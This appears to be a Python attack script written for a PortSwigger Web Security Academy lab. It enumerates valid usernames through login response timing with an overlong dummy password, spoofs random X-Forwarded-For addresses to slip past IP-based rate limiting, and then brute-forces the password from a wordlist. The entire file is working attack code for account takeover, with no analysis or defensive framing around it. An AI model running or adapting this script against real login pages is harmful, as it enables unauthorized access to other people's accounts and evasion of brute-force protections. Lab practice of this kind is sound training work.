import requests
import random


target = "https://acce1f211f01bb45c09bd98c00900022.web-security-academy.net/login"
session_id = "ZGcuccPbaHZaV6iQziKP8fjnzM4kb9gG"
session_cookie = {'session': session_id}
valid_creds = {'username': 'wiener', 'password': 'peter'}



dummy_string = "68" * 100
print(dummy_string)
user_list = open('/opt/wordlists/pswigusers.txt', 'r')
users = [l.strip('\n') for l in user_list]
users.reverse()
pass_list = open('/opt/wordlists/passwords.txt', 'r')
passwords = [i.strip('\n') for i in pass_list]



# avoid IP block by using valid credentials every 4 attempts
def crack():
    found_user = ''
    found_pass = ''
    attempts = 0
    calc = 0
    time_list = []
    greatest = 0
    greatest_user = ""
    for user in users:
        attempts += 1
        spoof_ip = str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(
            random.randint(1, 255)) + '.' + str(random.randint(1, 255))
        print(f'SPOOFING: {spoof_ip}')
        forward_for = {'X-Forwarded-For': spoof_ip}
        calc += 1
        print(f'ATTEMPT: {attempts}')
        data = {'username': user, 'password': dummy_string}
        response = requests.post(target, cookies=session_cookie, data=data, headers=forward_for)
        time = (response.elapsed.total_seconds() * 1000)
        time_list.append(time)
        average = sum(time_list) / calc
        if time > greatest:
            greatest = time
            greatest_user = user
            print(greatest_user)
        print(f'AVERAGE: {average}')
        print(f"RESPONSE TIME: {time}")


    found_user = greatest_user
    print(f'greatest time: {greatest_user}, time: {greatest}')
    for p in passwords:
        attempts += 1
        spoof_ip = str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255))
        forward_for = {'X-Forwarded-For': spoof_ip}
        print(f'ATTEMPT: {attempts}')
        data = {'username': found_user, 'password': p}
        response = requests.post(target, cookies=session_cookie, data=data, headers=forward_for)
        print(response.status_code)
        if 'Invalid' not in response.text:
            found_pass = p
            print(f'FOUND PASSWORD: {p}')
            break
    print(f'USERNAME: {found_user}, PASSWORD: {found_pass}')


crack()
